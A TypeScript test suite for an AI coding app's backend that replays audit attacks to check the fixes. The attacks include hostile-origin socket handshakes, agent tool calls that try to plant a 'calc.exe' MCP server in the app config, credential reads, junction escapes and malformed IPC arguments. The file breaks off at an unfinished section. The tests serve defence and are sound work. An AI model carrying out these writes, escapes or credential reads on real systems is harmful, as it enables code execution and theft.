/**
 * Round 8 (security): the attack surface audit's fixes, each checked by
 * replaying the attack it closes.
 *
 * Kept apart from smoke.ts the way the other rounds are; smoke.ts calls
 * `roundEightSecurityChecks` with its own check and section. Nothing here calls
 * a model or reaches the network - the only sockets opened are to a backend
 * started in a temporary folder. No check prints a secret: a detail that would
 * hold one names its length or its outcome instead.
 */
import fs from "node:fs/promises"
import { createServer, get as httpGet } from "node:http"
import os from "node:os"
import path from "node:path"
import WebSocket from "ws"
import type { Check } from "./smoke-round5"
import { startBackend } from "../src/server/index"
import { refusalOf, rendererOrigins, sameSecret } from "../src/server/socket-guard"
import { SOCKET_PROTOCOL, socketProtocols } from "../src/shared/socket-auth"
import type { ToolContext } from "../src/server/tool/types"
import { EditTool, WriteTool } from "../src/server/tool/edit"
import { ReadTool } from "../src/server/tool/read"
import { BashTool } from "../src/server/tool/bash"
import { NotebookEditTool } from "../src/server/tool/notebook"
import { appDataRefusal, protectAppData } from "../src/server/tool/app-data"
import { handle } from "../src/server/handlers"
import type { Request } from "../src/shared/protocol"
import { OFFICE_BYTES_LIMIT, OFFICE_SCHEMAS, officeRefusal } from "../src/main/office-guard"
import { MASK, redactCommand, redactString } from "../src/shared/mcp-redact"
import { scanMcpImports } from "../src/server/mcp-import"
import { redactSecrets } from "../src/main/log-file"
import { renderReply } from "../src/renderer/src/lib/markdown"
import { linkOnlyCard } from "../src/shared/media-platform"
import { enrichMedia } from "../src/renderer/src/lib/media-embed"
import { scanCommand, simpleCommands } from "../src/server/tool/bash-scan"
import { Permissions, namesAskingFile } from "../src/server/permission"
import { Storage } from "../src/server/storage"
import { Bus } from "../src/server/bus"
import { Config } from "../src/server/config"
import { resolveInsideReal } from "../src/server/tool/fs-util"
import { servePreview } from "../src/main/preview-server"

type Section = (name: string) => void

/** How a handshake ended: opened with the protocol the server chose, or refused with a status. */
async function dial(
  url: string,
  protocols: string[] | undefined,
  headers: Record<string, string> = {},
): Promise<{ opened: boolean; status?: number; protocol?: string; socket?: WebSocket }> {
  return new Promise((resolve) => {
    const socket = new WebSocket(url, protocols, { headers })
    socket.once("open", () => resolve({ opened: true, protocol: socket.protocol, socket }))
    socket.once("unexpected-response", (_request, response) => {
      resolve({ opened: false, status: response.statusCode })
      socket.terminate()
    })
    socket.once("error", () => resolve({ opened: false }))
  })
}

/** One request over an open socket, answered or not within a few seconds. */
async function ask(socket: WebSocket, request: Record<string, unknown>): Promise<{ ok: boolean; data?: unknown; error?: string }> {
  const id = `sec${Math.random().toString(36).slice(2)}`
  return new Promise((resolve) => {
    const timer = setTimeout(() => resolve({ ok: false, error: "no answer" }), 5000)
    socket.on("message", (raw) => {
      const frame = JSON.parse(raw.toString())
      if (frame.kind !== "response" || frame.id !== id) return
      clearTimeout(timer)
      resolve({ ok: frame.ok, data: frame.data, error: frame.error })
    })
    socket.send(JSON.stringify({ kind: "request", id, request }))
  })
}

export async function roundEightSecurityChecks(check: Check, section: Section): Promise<void> {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "mcode-round8-sec-"))
  try {
    await socketChecks(check, section, root)
    await appDataChecks(check, section, root)
    await fileRequestChecks(check, section, root)
    await officeChannelChecks(check, section, root)
    await maskingChecks(check, section, root)
    await egressChecks(check, section, root)
    await approvalChecks(check, section, root)
    await junctionChecks(check, section, root)
  } finally {
    await fs.rm(root, { recursive: true, force: true }).catch(() => undefined)
  }
}

// ------------------------------------------------------------------- X1
async function socketChecks(check: Check, section: Section, root: string): Promise<void> {
  section("Round 8 (X1): only this app's own window can open the backend socket")

  // The rule itself, with a secret that is not a real one.
  const admission = { port: 4100, secret: "s3cret-for-the-rule", origins: ["file://"] }
  const good = { host: "127.0.0.1:4100", protocols: socketProtocols(admission.secret).join(", ") }
  check("the app's own page with the secret is admitted", refusalOf({ ...good, origin: "file://" }, admission) === undefined)
  check("a local process with the secret and no Origin is admitted", refusalOf(good, admission) === undefined)
  check("no secret is refused", refusalOf({ host: good.host, protocols: SOCKET_PROTOCOL }, admission) === "secret")
  check("a wrong secret is refused", refusalOf({ ...good, protocols: socketProtocols("s3cret-for-the-rulf").join(",") }, admission) === "secret")
  check("an empty secret never matches an empty one", !sameSecret("", ""))
  check("a web page's Origin is refused even with the secret", refusalOf({ ...good, origin: "https://evil.example" }, admission) === "origin")
  check("so is a sandboxed frame's null Origin", refusalOf({ ...good, origin: "null" }, admission) === "origin")
  check("a preview page's localhost Origin is refused", refusalOf({ ...good, origin: "http://0123456789abcdef01234567.localhost:4101" }, admission) === "origin")
  check("a rebound host name is refused", refusalOf({ ...good, host: "attacker.example:4100" }, admission) === "host")
  check("another port on loopback is refused", refusalOf({ ...good, host: "127.0.0.1:4101" }, admission) === "host")
  check("a missing Host is refused", refusalOf({ protocols: good.protocols }, admission) === "host")
  check("the packaged page's origin is file://", rendererOrigins(undefined).join() === "file://")
  check("the dev server's origin is its own", rendererOrigins("http://localhost:5173/index.html").join() === "http://localhost:5173")

  // The legitimate client has to hold up its end, or the window never connects.
  const clientSource = await fs.readFile(path.join(process.cwd(), "src/renderer/src/lib/client.ts"), "utf8").catch(() => "")
  const mainSource = await fs.readFile(path.join(process.cwd(), "src/main/index.ts"), "utf8").catch(() => "")
  check("the window's client offers the secret to its own backend only", /this\.address === this\.own \? new WebSocket\(this\.address, socketProtocols\(this\.secret\)\)/.test(clientSource))
  check("the main process hands the secret over the bootstrap channel and names the page's origin", /secret: started\.secret/.test(mainSource) && /origins: rendererOrigins\(/.test(mainSource))

  // The same attacks against a running backend.
  const data = path.join(root, "socket-data")
  await fs.mkdir(path.join(data, "storage"), { recursive: true })
  await fs.writeFile(path.join(data, "storage", "config.json"), "{}")
  const warnings: string[] = []
  const warn = console.warn
  console.warn = (...args: unknown[]) => {
    warnings.push(args.map(String).join(" "))
  }
  const backend = await startBackend(data, { origins: ["file://"] })
  try {
    // Empty rather than a crash on a backend that makes none, so that case reads as failures.
    const secret = backend.secret ?? ""
    const url = `ws://127.0.0.1:${backend.port}`
    check("each launch makes a secret of 32 random bytes", typeof secret === "string" && Buffer.from(secret, "base64url").length === 32, secret?.length)
    const other = await startBackend(path.join(root, "socket-data-2"))
    check("and a second launch makes a different one", other.secret !== secret)
    await other.close()

    const bare = await dial(url, undefined)
    check("a client offering nothing is refused (401)", !bare.opened && bare.status === 401, bare.status)
    const plain = await dial(url, [SOCKET_PROTOCOL])
    check("a client offering only the protocol name is refused", !plain.opened && plain.status === 401, plain.status)
    const wrong = await dial(url, socketProtocols(`${secret.slice(0, -1)}${secret.endsWith("A") ? "B" : "A"}`))
    check("a client with a secret one character off is refused", !wrong.opened && wrong.status === 401, wrong.status)
    const page = await dial(url, socketProtocols(secret), { Origin: "https://evil.example" })
    check("a web page's handshake is refused even holding the secret (403)", !page.opened && page.status === 403, page.status)
    const rebound = await dial(url, socketProtocols(secret), { Host: `attacker.example:${backend.port}` })
    check("a handshake naming another host is refused (403)", !rebound.opened && rebound.status === 403, rebound.status)

    const local = await dial(url, socketProtocols(secret))
    check("a local client with the secret connects", local.opened)
    check("the server answers with the plain protocol name, never the secret", local.protocol === SOCKET_PROTOCOL, local.protocol === SOCKET_PROTOCOL ? SOCKET_PROTOCOL : "other")
    if (local.socket) {
      const listed = await ask(local.socket, { type: "session.list" })
      check("and its requests are served", listed.ok && Array.isArray((listed.data as { sessions?: unknown })?.sessions), listed.error)
      local.socket.close()
    }
    const window = await dial(url, socketProtocols(secret), { Origin: "file://" })
    check("the packaged window's origin with the secret connects", window.opened)
    window.socket?.close()

    check("refusals are logged", warnings.some((line) => line.includes("[socket] refused")), warnings.length)
    check("no log line holds the secret or a guess at it", !warnings.some((line) => line.includes(secret) || line.includes(secret.slice(0, 12))))
  } finally {
    console.warn = warn
    await backend.close()
  }
}

/** A tool context whose every permission question is answered yes, as the default level answers a write outside the project. */
function allowingContext(directory: string): ToolContext {
  return {
    sessionID: "ses_sec",
    messageID: "msg_sec",
    callID: "call_sec",
    directory,
    permissions: { ask: async () => undefined, allowsOutside: () => true },
    questions: { ask: async () => undefined },
    signal: new AbortController().signal,
    progress: () => {},
    snapshot: async () => undefined,
  } as unknown as ToolContext
}

/** How a call ended: an empty message when it succeeded, else the error and its code. */
async function failure(run: () => Promise<unknown>): Promise<{ message: string; code?: string }> {
  try {
    await run()
    return { message: "" }
  } catch (err) {
    return { message: err instanceof Error ? err.message : String(err), code: (err as { code?: string }).code }
  }
}

// ------------------------------------------------------------------- X2
async function appDataChecks(check: Check, section: Section, root: string): Promise<void> {
  section("Round 8 (X2): the model cannot rewrite the app's own configuration")
  const data = path.join(root, "app-data")
  const storage = path.join(data, "storage")
  const project = path.join(root, "x2-project")
  await fs.mkdir(storage, { recursive: true })
  await fs.mkdir(project, { recursive: true })
  const configFile = path.join(storage, "config.json")
  await fs.writeFile(configFile, "{}")
  await fs.writeFile(path.join(data, "credentials.json"), "{}")
  // Started for real, so what is tested is the backend registering its own folder.
  const backend = await startBackend(data)
  await backend.close()
  const context = allowingContext(project)
  const planted = JSON.stringify({ mcpServers: { evil: { type: "local", command: ["calc.exe"] } } })

  const written = await failure(() => WriteTool.execute({ file_path: configFile, content: planted }, context))
  check("write into config.json is refused at the default level", written.code === "tool.err.appData", written)
  check("...and says why in words the model can act on", written.message.includes("configuration") && written.message.includes("Settings"), written.message)
  check("...and the file is untouched", !(await fs.readFile(configFile, "utf8")).includes("calc.exe"))
  const edited = await failure(() => EditTool.execute({ file_path: configFile, old_string: "{}", new_string: '{"evil":{}}' }, context))
  check("edit of config.json is refused", edited.code === "tool.err.appData", edited)
  const climbing = await failure(() => WriteTool.execute({ file_path: path.relative(project, path.join(storage, "automations.json")), content: "{}" }, context))
  check("a relative path climbing into the data folder is refused", climbing.code === "tool.err.appData", climbing)
  const shouted = await failure(() => WriteTool.execute({ file_path: path.join(data, "STORAGE", "Config.json"), content: planted }, context))
  check("a differently cased spelling is refused too", shouted.code === "tool.err.appData", shouted)
  const notebook = await failure(() => NotebookEditTool.execute({ notebook_path: path.join(data, "x.ipynb"), new_source: "x", cell_id: "a" }, context))
  check("the notebook tool is refused there", notebook.code === "tool.err.appData", notebook)

  // A link inside the project that leads into the data folder.
  const link = path.join(project, "linked")
  if (await fs.symlink(storage, link, "junction").then(() => true, () => false)) {
    const through = await failure(() => WriteTool.execute({ file_path: path.join(link, "config.json"), content: planted }, context))
    check("a junction from the project into the data folder is followed and refused", through.code === "tool.err.appData", through)
  }

  const bashed = await failure(() => BashTool.execute({ command: `echo x > "${configFile}"`, description: "write" }, context))
  check("a shell redirect into config.json is refused before it runs", bashed.code === "tool.err.appData", bashed)
  const copied = await failure(() => BashTool.execute({ command: `cp evil.json "${configFile}"`, description: "copy" }, context))
  check("a copy onto config.json is refused", copied.code === "tool.err.appData", copied)
  const spaced = path.join(data, "storage", "with space")
  const quoted = await failure(() => BashTool.execute({ command: `echo x > "${path.join(spaced, "x.json")}"`, description: "write" }, context))
  check("a quoted target with a space in it is read whole and refused", quoted.code === "tool.err.appData", quoted)
  const fromBackup = await failure(() => BashTool.execute({ command: `cp "${configFile}" backup.json`, description: "copy" }, context))
  check("copying config.json out of the folder is still allowed", fromBackup.code !== "tool.err.appData", fromBackup)
  if (process.platform === "win32") {
    process.env.MCODE_R8_DATA = data
    const viaEnv = await failure(() =>
      BashTool.execute({ command: 'Set-Content -Path "$env:MCODE_R8_DATA\\storage\\config.json" -Value x', description: "write" }, context),
    )
    check("a PowerShell write naming the folder through an environment variable is refused", viaEnv.code === "tool.err.appData", viaEnv)
    delete process.env.MCODE_R8_DATA
  }
  const after = await fs.readFile(configFile, "utf8")
  // The backend may still tidy the file after closing, so what is compared is what an attack would have left.
  const parsed = (() => {
    try {
      return JSON.parse(after) as { mcpServers?: Record<string, unknown> }
    } catch {
      return undefined
    }
  })()
  check("config.json is still the app's own after all of it", Boolean(parsed) && !after.includes("calc.exe") && !parsed?.mcpServers?.evil, after.slice(0, 80))

  const secretRead = await failure(() => ReadTool.execute({ file_path: path.join(data, "credentials.json") }, context))
  check("reading the saved credentials is refused", secretRead.code === "tool.err.appSecret", secretRead)
  check("so is the MCP sign-in file", (await appDataRefusal(path.join(storage, "mcp-auth.json"), "read")) === "secret")
  const configRead = await failure(() => ReadTool.execute({ file_path: configFile }, context))
  check("reading config.json is still allowed", configRead.message === "", configRead)

  // What features write there on purpose still works.
  const memory = path.join(data, "memory", "notes.md")
  await fs.mkdir(path.dirname(memory), { recursive: true })
  check("the memory folder stays writable", (await failure(() => WriteTool.execute({ file_path: memory, content: "note" }, context))).message === "")
  const plan = path.join(storage, "plans", "1-brisk-anchor.md")
  await fs.mkdir(path.dirname(plan), { recursive: true })
  check("a plan file stays writable", (await failure(() => WriteTool.execute({ file_path: plan, content: "# plan" }, context))).message === "")
  check("but not a file of another kind beside it", (await appDataRefusal(path.join(storage, "plans", "x.json"), "write")) === "write")
  const skill = path.join(storage, "skills", "mine", "SKILL.md")
  await fs.mkdir(path.dirname(skill), { recursive: true })
  check("a user skill stays writable (skill-creator makes them there)", (await failure(() => WriteTool.execute({ file_path: skill, content: "---\nname: mine\n---\n" }, context))).message === "")
  check("the global AGENTS.md stays writable", (await appDataRefusal(path.join(storage, "AGENTS.md"), "write")) === undefined)
  check("a project file is unaffected", (await failure(() => WriteTool.execute({ file_path: path.join(project, "a.txt"), content: "a" }, context))).message === "")
  check("a folder that only shares the name's start is unaffected", (await appDataRefusal(`${data}-other${path.sep}config.json`, "write")) === undefined)
}

// ------------------------------------------------------------------- X4
async function fileRequestChecks(check: Check, section: Section, root: string): Promise<void> {
  section("Round 8 (X4): the files tab's reads and saves stay where MiMo's do")
  const data = path.join(root, "x4-data")
  const project = path.join(root, "x4-project")
  const elsewhere = path.join(root, "x4-elsewhere")
  for (const folder of [path.join(data, "storage", "plans"), project, elsewhere]) await fs.mkdir(folder, { recursive: true })
  await fs.writeFile(path.join(data, "storage", "config.json"), "{}")
  await fs.writeFile(path.join(data, "credentials.json"), "{}")
  await fs.writeFile(path.join(data, "storage", "plans", "1-a-b.md"), "# plan\n")
  await fs.writeFile(path.join(project, "notes.txt"), "project\n")
  await fs.writeFile(path.join(elsewhere, "private.txt"), "elsewhere\n")
  const backend = await startBackend(data)
  const runtime = backend.runtime
  try {
    await handle(runtime, { type: "project.add", directory: project })
    /*
     * Each attack also names the target the old way, as `path`: a backend that
     * still honoured it would carry the attack out, so these fail on that code.
     */
    const ask = (request: Record<string, unknown>) =>
      handle(runtime, request as unknown as Request).then(
        (value) => ({ ok: true, value: value as { content?: string } }),
        (err: unknown) => ({ ok: false, message: err instanceof Error ? err.message : String(err) }),
      )
    const credentials = path.join(data, "credentials.json")

    const oldShape = await ask({ type: "file.read", path: path.join(elsewhere, "private.txt") })
    check("a read naming only an absolute path is refused", !oldShape.ok, oldShape)
    const climbing = await ask({ type: "file.read", root: project, rel: "../x4-elsewhere/private.txt", path: path.join(elsewhere, "private.txt") })
    check("a read climbing out of its root is refused", !climbing.ok && /^outside/.test(climbing.message ?? ""), climbing)
    const absoluteRel = await ask({ type: "file.read", root: project, rel: path.join(elsewhere, "private.txt"), path: path.join(elsewhere, "private.txt") })
    check("a read whose relative part is absolute is refused", !absoluteRel.ok, absoluteRel)
    const secret = await ask({ type: "file.read", root: data, rel: "credentials.json", path: credentials })
    check("the saved credentials are never read", !secret.ok, secret)
    const hidden = await ask({ type: "file.read", root: path.join(data, "storage"), rel: "config.json", path: path.join(data, "storage", "config.json") })
    check("the app's config.json is not shown in the tab", !hidden.ok, hidden)
    const plan = await ask({ type: "file.read", root: path.join(data, "storage", "plans"), rel: "1-a-b.md", preview: true })
    check("a plan file in the app's folder still is", plan.ok && plan.value?.content === "# plan\n", plan)
    const inProject = await ask({ type: "file.read", root: project, rel: "notes.txt", preview: true })
    check("a project file reads as before", inProject.ok && inProject.value?.content === "project\n", inProject)
    const outsideView = await ask({ type: "file.read", root: elsewhere, rel: "private.txt", preview: true })
    check("a file outside every project still opens rooted at its own folder (MiMo's openFileInViewer)", outsideView.ok, outsideView)
    const link = path.join(project, "out-link")
    const linked = await fs.symlink(elsewhere, link, "junction").then(() => true, () => false)

    const saveOutside = await ask({ type: "file.write", root: elsewhere, rel: "private.txt", content: "owned", path: path.join(elsewhere, "private.txt") })
    check("a save outside every project is refused", !saveOutside.ok && /^outside/.test(saveOutside.message ?? ""), saveOutside)
    check("...and the file is unchanged", (await fs.readFile(path.join(elsewhere, "private.txt"), "utf8")) === "elsewhere\n")
    if (linked) {
      const throughLink = await ask({ type: "file.write", root: project, rel: "out-link/private.txt", content: "owned", path: path.join(elsewhere, "private.txt") })
      check("a save through a junction out of the project is refused", !throughLink.ok, throughLink)
      const readLink = await ask({ type: "file.read", root: project, rel: "out-link/private.txt", path: path.join(elsewhere, "private.txt") })
      check("a read through that junction is refused by its root", !readLink.ok, readLink)
    }
    const saveConfig = await ask({ type: "file.write", root: data, rel: "storage/config.json", content: '{"mcpServers":{"evil":{}}}', path: path.join(data, "storage", "config.json") })
    check("a save over the app's config.json is refused", !saveConfig.ok, saveConfig)
    check("...and it holds no planted server", !(await fs.readFile(path.join(data, "storage", "config.json"), "utf8")).includes("evil"))
    if (process.platform === "win32") {
      const stream = await ask({ type: "file.write", root: project, rel: "notes.txt:hidden", content: "x", path: path.join(project, "notes.txt:hidden") })
      check("a save into an alternate data stream is refused", !stream.ok, stream)
    }
    const noText = await ask({ type: "file.write", root: project, rel: "notes.txt", content: 42 })
    check("a save whose content is not text is refused", !noText.ok, noText)
    const saved = await ask({ type: "file.write", root: project, rel: "notes.txt", content: "edited\n" })
    check("a save inside the project works", saved.ok && (await fs.readFile(path.join(project, "notes.txt"), "utf8")) === "edited\n", saved)
    const savedPlan = await ask({ type: "file.write", root: path.join(data, "storage", "plans"), rel: "1-a-b.md", content: "# edited\n" })
    check("so does a save to a plan in the app's folder", savedPlan.ok, savedPlan)
  } finally {
    await backend.close()
  }
}

// ------------------------------------------------------------------- X5
async function officeChannelChecks(check: Check, section: Section, root: string): Promise<void> {
  section("Round 8 (X5): every Office channel checks its arguments before it runs")
  const project = path.join(root, "x5-project")
  const elsewhere = path.join(root, "x5-elsewhere")
  const data = path.join(root, "x5-data")
  for (const folder of [project, elsewhere, path.join(data, "storage")]) await fs.mkdir(folder, { recursive: true })
  protectAppData(data)
  const roots = async () => [project]
  const refused = (channel: string, ...args: unknown[]) => officeRefusal(channel, args, roots)
  const docx = path.join(project, "report.docx")
  const small = Buffer.from("PK").toString("base64")

  const source = await fs.readFile(path.join(process.cwd(), "src/main/office.ts"), "utf8").catch(() => "")
  const registered = [...source.matchAll(/checked\("(mcode:[\w-]+)"/g)].map((match) => match[1]!)
  check("office.ts registers no channel around the checks", !/ipcMain\.handle\("mcode:/.test(source), source.match(/ipcMain\.handle\("mcode:[\w-]+/g))
  check("every channel it registers has a declared schema", registered.length === 11 && registered.every((channel) => OFFICE_SCHEMAS[channel]), registered)

  // Shapes: wrong types, missing arguments, oversize values, extra arguments.
  check("a restore with no file is refused", (await refused("mcode:office-version-restore", undefined, "v1")) === "shape")
  check("a restore of a relative file is refused", (await refused("mcode:office-version-restore", "report.docx", "v1")) === "shape")
  check("a version id that climbs is refused", (await refused("mcode:office-version-restore", docx, "../../x")) === "shape")
  check("a record with an unknown source is refused", (await refused("mcode:office-version-record", docx, small, "admin", "")) === "shape")
  check("a record whose bytes are an object is refused", (await refused("mcode:office-version-record", docx, { length: 1 }, "user", "")) === "shape")
  check("bytes that are not base64 are refused", (await refused("mcode:office-version-init", docx, "<script>", false, "")) === "shape")
  check("bytes past the document limit are refused", (await refused("mcode:write-file-bytes", project, "a.xlsx", "A".repeat(Math.ceil(OFFICE_BYTES_LIMIT / 3) * 4 + 4))) === "shape")
  check("a note of megabytes is refused", (await refused("mcode:office-version-init", docx, small, false, "x".repeat(100_000))) === "shape")
  check("assumeAi that is not a boolean is refused", (await refused("mcode:office-version-init", docx, small, "yes", "")) === "shape")
  check("an extra argument is refused", (await refused("mcode:file-size", docx, "extra")) === "shape")
  check("a path with a NUL byte is refused", (await refused("mcode:reveal-path", `${docx}\0.txt`)) === "shape")
  check("a watch on a number is refused", (await refused("mcode:watch-file", 42)) === "shape")
  check("an absolute relative part is refused", (await refused("mcode:read-file-bytes", project, docx)) === "shape")
  check("an ifUnchanged that is not a size and time is refused", (await refused("mcode:read-file-bytes", docx, undefined, { size: "1" })) === "shape")
  check("a channel with no schema is refused", (await refused("mcode:not-a-channel", docx)) === "shape")

  // Places: writes outside the working folders, reads of the app's own data.
  check("a restore over a file outside the projects is refused", (await refused("mcode:office-version-restore", path.join(elsewhere, "x.html"), "v1")) === "place")
  check("writing a spreadsheet outside the projects is refused", (await refused("mcode:write-file-bytes", elsewhere, "book.xlsx", small)) === "place")
  check("writing through a root of C:\\ style is refused", (await refused("mcode:write-file-bytes", path.parse(project).root, path.relative(path.parse(project).root, path.join(elsewhere, "book.xlsx")), small)) === "place")
  check("a relative part climbing out of a project root is refused", (await refused("mcode:write-file-bytes", project, "../x5-elsewhere/book.xlsx", small)) === "place")
  check("serving the app's data folder is refused", (await refused("mcode:office-serve", path.join(data, "storage", "page.html"))) === "place")
  check("reading the saved credentials through the tab is refused", (await refused("mcode:read-file-bytes", data, "credentials.json")) === "place")
  check("recording versions of the app's config is refused", (await refused("mcode:office-version-record", path.join(data, "storage", "config.json"), small, "user", "")) === "place")

  // What the tab does every day still passes.
  check("reading a document anywhere passes (attachments open from the desktop)", (await refused("mcode:read-file-bytes", elsewhere, "doc.docx", { size: 1, mtimeMs: 2 })) === undefined)
  check("reading with only a root passes", (await refused("mcode:read-file-bytes", docx, undefined, undefined)) === undefined)
  check("writing a spreadsheet in the project passes", (await refused("mcode:write-file-bytes", project, "book.xlsx", small)) === undefined)
  check("recording and restoring a project document passes", (await refused("mcode:office-version-record", docx, small, "ai", "note")) === undefined && (await refused("mcode:office-version-restore", docx, "vlk2x9ab12")) === undefined)
  check("an init with no note passes", (await refused("mcode:office-version-init", docx, small, true)) === undefined)
}

// ------------------------------------------------------------------- X8
async function maskingChecks(check: Check, section: Section, root: string): Promise<void> {
  section("Round 8 (X8): MCP secrets are masked wherever they are shown or logged")
  // Made-up values shaped like secrets; no detail below prints them.
  const fakeKey = "sk-fake0000000000000000"
  const fakeToken = "tok-fake-1111111111"
  const fakeBearer = "fake-bearer-2222222222"
  const fakeEnv = "fake-env-3333333333"
  const fakeClient = "fake-client-4444444444"
  const fakeHeader = "fake-header-5555555555"
  const secrets = [fakeKey, fakeToken, fakeBearer, fakeEnv, fakeClient, fakeHeader]
  const leaks = (text: string) => secrets.filter((value) => text.includes(value)).length

  check("a bearer value is masked", redactString(`Bearer ${fakeBearer}`) === `Bearer ${MASK}`)
  check("a credential query parameter is masked, the rest kept", redactString(`https://x.example/mcp?region=eu&access_token=${fakeToken}`) === `https://x.example/mcp?region=eu&access_token=${MASK}`)
  check("a key=value argument is masked", redactString(`--header=apikey=${fakeKey}`).endsWith(`apikey=${MASK}`))
  check("the value after a credential flag is masked", redactCommand(["npx", "server", "--api-key", fakeKey, "--port", "3000"]).join(" ") === `npx server --api-key ${MASK} --port 3000`)
  check("an ordinary command is left alone", redactCommand(["node", "server.js", "--verbose"]).join(" ") === "node server.js --verbose")
  check("the log masks a credential flag's value", leaks(redactSecrets(`spawn failed: npx server --api-key ${fakeKey}`)) === 0)
  check("...and the same in a logged JSON array", leaks(redactSecrets(JSON.stringify(["--token", fakeToken]))) === 0)
  check("...and a credential query parameter of any name", leaks(redactSecrets(`GET https://x.example/mcp?access_token=${fakeToken}`)) === 0)

  const home = path.join(root, "x8-home")
  await fs.mkdir(home, { recursive: true })
  await fs.writeFile(
    path.join(home, ".claude.json"),
    JSON.stringify({
      mcpServers: {
        local: { command: "npx", args: ["server", "--token", fakeToken] },
        remote: { url: `https://x.example/mcp?api_key=${fakeKey}`, headers: { Authorization: `Bearer ${fakeBearer}` } },
      },
    }),
  )
  const previousHome = process.env.MCODE_IMPORT_HOME
  process.env.MCODE_IMPORT_HOME = home
  try {
    const found = await scanMcpImports({})
    check("the import list shows both servers", found.length === 2, found.length)
    check("...with their tokens masked in what it shows", found.every((item) => leaks(item.summary) === 0) && found.some((item) => item.summary.includes(MASK)))
  } finally {
    if (previousHome === undefined) delete process.env.MCODE_IMPORT_HOME
    else process.env.MCODE_IMPORT_HOME = previousHome
  }

  // The window's own view of the settings, over a real socket.
  const data = path.join(root, "x8-data")
  await fs.mkdir(path.join(data, "storage"), { recursive: true })
  await fs.writeFile(path.join(data, "storage", "config.json"), "{}")
  const backend = await startBackend(data)
  const opened = await dial(`ws://127.0.0.1:${backend.port}`, socketProtocols(backend.secret ?? ""))
  const socket = opened.socket
  if (!socket) {
    check("a socket to the backend opens", false)
    await backend.close()
    return
  }
  const seen: string[] = []
  socket.on("message", (raw) => seen.push(raw.toString()))
  try {
    const servers = {
      tool: {
        type: "local" as const,
        command: ["npx", "server", "--api-key", fakeKey],
        environment: { SERVICE_KEY: fakeEnv },
        enabled: false,
      },
      web: {
        type: "remote" as const,
        url: `https://x.example/mcp?token=${fakeToken}`,
        headers: { Authorization: `Bearer ${fakeBearer}` },
        oauth: { clientId: "id", clientSecret: fakeClient },
        enabled: false,
      },
    }
    await backend.runtime.config.set({
      mcpServers: servers,
      customProviders: [{ id: "gw", name: "Gateway", baseURL: "https://gw.example/v1", headers: { "x-api-key": fakeHeader, "x-route": "eu" }, models: [{ id: "m", name: "M" }] }],
    })
    const got = await ask(socket, { type: "config.get" })
    const text = JSON.stringify(got.data)
    check("config.get reaches the window with no secret in it", got.ok && leaks(text) === 0, leaks(text))
    const config = (got.data as { config: { mcpServers: typeof servers; customProviders: { headers?: Record<string, string> }[] } }).config
    check("the command keeps its shape with the key masked", config.mcpServers.tool.command.join(" ") === `npx server --api-key ${MASK}`)
    check("the header and variable names are still there", Object.keys(config.mcpServers.web.headers).join() === "Authorization" && Object.keys(config.mcpServers.tool.environment).join() === "SERVICE_KEY")
    check("a routing header of a custom provider is still shown", config.customProviders[0]?.headers?.["x-route"] === "eu")

    // The page's own toggle sends the entries back as it was shown them.
    const toggled = { ...config.mcpServers, web: { ...config.mcpServers.web, enabled: true, url: config.mcpServers.web.url } }
    toggled.web.enabled = false
    const set = await ask(socket, { type: "config.set", patch: { mcpServers: toggled, customProviders: config.customProviders } })
    check("a settings save answers masked too", set.ok && leaks(JSON.stringify(set.data)) === 0)
    const stored = backend.runtime.config.get()
    check("...and what the window sent back masked keeps the stored secrets", leaks(JSON.stringify(stored.mcpServers)) === 5 && leaks(JSON.stringify(stored.customProviders)) === 1, leaks(JSON.stringify(stored)))
    check("no masked text was written into the stored settings", !JSON.stringify(stored.mcpServers).includes(MASK) && !JSON.stringify(stored.customProviders).includes(MASK))

    // The MCP form's own save: the command line and arguments as shown.
    const saved = await ask(socket, {
      type: "mcp.save",
      name: "tool",
      entry: { type: "local", command: ["npx", "server", "--api-key", MASK, "--extra"], environment: { SERVICE_KEY: "" }, enabled: false },
      keep: { env: ["SERVICE_KEY"] },
    })
    const tool = backend.runtime.config.get().mcpServers.tool
    check("an MCP edit that leaves the masked key keeps the stored one", saved.ok && tool?.command?.join(" ") === `npx server --api-key ${fakeKey} --extra`)
    check("...and its kept variable", tool?.environment?.SERVICE_KEY === fakeEnv)

    await new Promise((resolve) => setTimeout(resolve, 100))
    const events = seen.filter((line) => line.includes('"config.updated"'))
    check("every settings event sent to the window is masked", events.length > 0 && events.every((line) => leaks(line) === 0), events.length)
    check("nothing the window was sent holds a secret", seen.every((line) => leaks(line) === 0), seen.length)
  } finally {
    socket.close()
    await backend.close()
  }
}

// ---------------------------------------------------------- E3, E19, E11
async function egressChecks(check: Check, section: Section, root: string): Promise<void> {
  section("Round 8 (E3): the home screen sends nothing to a model")
  {
    const home = await fs.readFile(path.join(process.cwd(), "src/renderer/src/components/HomeHero.vue"), "utf8").catch(() => "")
    const protocol = await fs.readFile(path.join(process.cwd(), "src/shared/protocol.ts"), "utf8").catch(() => "")
    const serverFile = await fs.stat(path.join(process.cwd(), "src/server/home-suggest.ts")).then(() => true, () => false)
    check("the home screen makes no suggestion request", !home.includes("home.suggest") && !/client\.request\(\{ type: "home\./.test(home))
    check("the protocol has no such request", !protocol.includes('"home.suggest"'))
    check("the server code that built it is gone", !serverFile)

    // A model standing by, which must hear nothing when the backend is asked the old way.
    const heard: string[] = []
    const stub = createServer((request, response) => {
      heard.push(request.url ?? "")
      response.writeHead(200, { "content-type": "application/json" })
      response.end(JSON.stringify({ data: [{ id: "stub-model" }] }))
    })
    await new Promise<void>((resolve) => stub.listen(0, "127.0.0.1", resolve))
    const port = (stub.address() as { port: number }).port
    const data = path.join(root, "e3-data")
    const project = path.join(root, "e3-project")
    await fs.mkdir(path.join(data, "storage"), { recursive: true })
    await fs.mkdir(project, { recursive: true })
    await fs.writeFile(path.join(project, "secret-plan.md"), "x")
    await fs.writeFile(path.join(data, "storage", "config.json"), "{}")
    const backend = await startBackend(data)
    try {
      await backend.runtime.config.set({
        providerEndpoints: { lmstudio: `http://127.0.0.1:${port}/v1` },
        model: { provider: "lmstudio", model: "stub-model" },
      })
      await handle(backend.runtime, { type: "provider.auth", provider: "lmstudio", apiKey: "local" } as unknown as Request).catch(() => undefined)
      heard.length = 0
      const answer = await handle(backend.runtime, { type: "home.suggest", directory: project, language: "en" } as unknown as Request).catch(() => undefined)
      await new Promise((resolve) => setTimeout(resolve, 300))
      check("asked the old way, the backend answers nothing", answer === undefined, answer)
      check("...and no request reaches the model", heard.length === 0, heard)
    } finally {
      await backend.close()
      stub.close()
    }
  }

  section("Round 8 (E19): a web picture in a reply loads only on a click")
  {
